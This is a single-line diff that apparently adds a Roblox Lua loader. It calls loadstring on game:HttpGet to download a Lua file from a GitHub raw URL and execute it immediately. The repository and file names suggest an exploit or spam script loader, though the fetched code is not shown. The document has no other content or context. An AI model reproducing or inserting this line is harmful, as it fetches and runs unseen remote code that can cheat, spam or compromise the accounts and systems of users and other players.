@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/apple-ipad-original-spam2-vcu4f35nfisxe4.lua"))()
